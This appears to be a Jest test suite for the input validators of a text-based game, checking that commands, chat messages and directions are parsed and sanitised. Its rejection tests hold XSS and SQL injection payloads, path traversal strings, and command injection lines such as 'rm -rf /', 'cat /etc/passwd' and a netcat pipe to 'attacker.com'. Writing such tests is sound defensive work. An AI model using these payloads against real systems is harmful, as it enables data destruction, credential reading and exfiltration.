import {
    validateCommandInput,
    parseCommand,
    sanitizeInput,
    isValidMessage,
    isValidDirection
} from './validators';

describe('Validator Security Tests', () => {
    describe('validateCommandInput', () => {
        it('should accept valid commands', () => {
            expect(validateCommandInput('look')).toEqual({ valid: true });
            expect(validateCommandInput('attack ghost')).toEqual({ valid: true });
            expect(validateCommandInput('say hello world')).toEqual({ valid: true });
        });

        it('should reject empty commands', () => {
            expect(validateCommandInput('')).toEqual({
                valid: false,
                error: 'Command cannot be empty'
            });
            expect(validateCommandInput('   ')).toEqual({
                valid: false,
                error: 'Command cannot be empty'
            });
        });

        it('should reject commands that are too long', () => {
            const longCommand = 'a'.repeat(501);
            const result = validateCommandInput(longCommand);
            expect(result.valid).toBe(false);
            expect(result.error).toContain('too long');
        });

        it('should reject XSS attempts', () => {
            expect(validateCommandInput('<script>alert("xss")</script>').valid).toBe(false);
            expect(validateCommandInput('say <img src=x onerror=alert(1)>').valid).toBe(false);
            expect(validateCommandInput('javascript:alert(1)').valid).toBe(false);
        });

        it('should reject SQL injection attempts', () => {
            expect(validateCommandInput("'; DROP TABLE players--").valid).toBe(false);
            expect(validateCommandInput("admin'--").valid).toBe(false);
            expect(validateCommandInput("1' OR '1'='1").valid).toBe(false);
        });

        it('should reject null bytes', () => {
            expect(validateCommandInput('look\x00').valid).toBe(false);
            expect(validateCommandInput('\x00attack').valid).toBe(false);
        });

        it('should accept commands with special characters', () => {
            expect(validateCommandInput("say It's a nice day!")).toEqual({ valid: true });
            expect(validateCommandInput('emote *waves*')).toEqual({ valid: true });
        });
    });

    describe('parseCommand', () => {
        it('should parse command and args correctly', () => {
            expect(parseCommand('look')).toEqual({ command: 'look', args: '' });
            expect(parseCommand('attack ghost')).toEqual({ command: 'attack', args: 'ghost' });
            expect(parseCommand('say hello world')).toEqual({ command: 'say', args: 'hello world' });
        });

        it('should trim whitespace', () => {
            expect(parseCommand('  look  ')).toEqual({ command: 'look', args: '' });
            expect(parseCommand('  attack   ghost  ')).toEqual({ command: 'attack', args: 'ghost' });
        });

        it('should handle empty string', () => {
            expect(parseCommand('')).toEqual({ command: '', args: '' });
        });

        it('should lowercase command but not args', () => {
            expect(parseCommand('ATTACK Ghost')).toEqual({ command: 'attack', args: 'Ghost' });
            expect(parseCommand('Say HELLO')).toEqual({ command: 'say', args: 'HELLO' });
        });
    });

    describe('sanitizeInput', () => {
        it('should remove dangerous characters', () => {
            expect(sanitizeInput('<script>alert(1)</script>', 100)).not.toContain('<script>');
            expect(sanitizeInput('test\x00null', 100)).toBe('testnull');
        });

        it('should trim to max length', () => {
            const input = 'a'.repeat(200);
            expect(sanitizeInput(input, 50).length).toBe(50);
        });

        it('should preserve safe content', () => {
            expect(sanitizeInput('Hello, world!', 100)).toBe('Hello, world!');
            expect(sanitizeInput("It's a test", 100)).toBe("It's a test");
        });

        it('should handle unicode properly', () => {
            expect(sanitizeInput('Hello 🌍', 100)).toContain('Hello');
        });
    });

    describe('isValidMessage', () => {
        it('should accept valid messages', () => {
            expect(isValidMessage('Hello, world!')).toBe(true);
            expect(isValidMessage("It's a nice day")).toBe(true);
            expect(isValidMessage('Testing 123')).toBe(true);
        });

        it('should reject empty messages', () => {
            expect(isValidMessage('')).toBe(false);
            expect(isValidMessage('   ')).toBe(false);
        });

        it('should reject very long messages', () => {
            const longMessage = 'a'.repeat(501);
            expect(isValidMessage(longMessage)).toBe(false);
        });

        it('should reject XSS attempts', () => {
            expect(isValidMessage('<script>alert(1)</script>')).toBe(false);
            expect(isValidMessage('javascript:alert(1)')).toBe(false);
            expect(isValidMessage('<img src=x onerror=alert(1)>')).toBe(false);
        });

        it('should accept messages with special characters', () => {
            expect(isValidMessage('Hello! How are you?')).toBe(true);
            expect(isValidMessage('*waves* :)')).toBe(true);
        });
    });

    describe('isValidDirection', () => {
        it('should accept valid full directions', () => {
            expect(isValidDirection('north')).toBe(true);
            expect(isValidDirection('south')).toBe(true);
            expect(isValidDirection('east')).toBe(true);
            expect(isValidDirection('west')).toBe(true);
        });

        it('should accept valid direction aliases', () => {
            expect(isValidDirection('n')).toBe(true);
            expect(isValidDirection('s')).toBe(true);
            expect(isValidDirection('e')).toBe(true);
            expect(isValidDirection('w')).toBe(true);
        });

        it('should reject invalid directions', () => {
            expect(isValidDirection('up')).toBe(false);
            expect(isValidDirection('down')).toBe(false);
            expect(isValidDirection('invalid')).toBe(false);
            expect(isValidDirection('')).toBe(false);
        });

        it('should be case insensitive', () => {
            expect(isValidDirection('NORTH')).toBe(true);
            expect(isValidDirection('N')).toBe(true);
        });
    });

    describe('Edge Cases & Attack Vectors', () => {
        it('should handle various XSS payloads', () => {
            const xssPayloads = [
                '<img src="x" onerror="alert(1)">',
                '<svg onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
                'onerror=alert(1)',
                'onclick=alert(1)'
            ];

            xssPayloads.forEach(payload => {
                expect(validateCommandInput(payload).valid).toBe(false);
                expect(isValidMessage(payload)).toBe(false);
            });
        });

        it('should handle various SQL injection payloads', () => {
            const sqlPayloads = [
                "'; DROP TABLE players--",
                "admin'--",
                "1' OR '1'='1",
                "' UNION SELECT * FROM users--",
                "'; DELETE FROM * --"
            ];

            sqlPayloads.forEach(payload => {
                expect(validateCommandInput(payload).valid).toBe(false);
            });
        });

        it('should handle command injection attempts', () => {
            expect(validateCommandInput('look; rm -rf /').valid).toBe(false);
            expect(validateCommandInput('look && cat /etc/passwd').valid).toBe(false);
            expect(validateCommandInput('look | nc attacker.com 1234').valid).toBe(false);
        });

        it('should handle path traversal attempts', () => {
            expect(sanitizeInput('../../../etc/passwd', 100)).not.toContain('../');
            expect(sanitizeInput('..\\..\\..\\windows\\system32', 100)).not.toContain('..\\');
        });

        it('should handle unicode exploits', () => {
            // Right-to-left override attempts
            expect(sanitizeInput('test\u202Emalicious', 100)).not.toContain('\u202E');
        });
    });
});
